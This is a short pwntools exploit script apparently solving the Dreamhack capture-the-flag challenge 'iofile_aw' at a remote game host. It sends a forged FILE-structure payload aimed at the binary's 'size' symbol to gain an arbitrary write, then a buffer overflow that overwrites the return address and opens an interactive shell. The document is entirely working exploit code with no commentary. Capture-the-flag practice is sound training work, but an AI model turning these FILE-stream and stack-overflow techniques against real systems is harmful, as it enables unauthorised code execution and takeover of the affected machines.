from pwn import *
#p = process("./iofile_aw")
p = remote("host1.dreamhack.games", 12636)
pause()
elf = ELF("./iofile_aw")
libc = elf.libc

if __name__ == "__main__":
    payload = p64(0xfbad2488)
    payload += p64(0x0) * 6 
    payload += p64(elf.symbols['size'])
    print(len(payload))
    p.send("printf " + payload)
    p.interactive()
    p.sendline("a" * (528 + 0x20 - 0x10) + p64(0x4009fa) * 2)
    p.interactive()

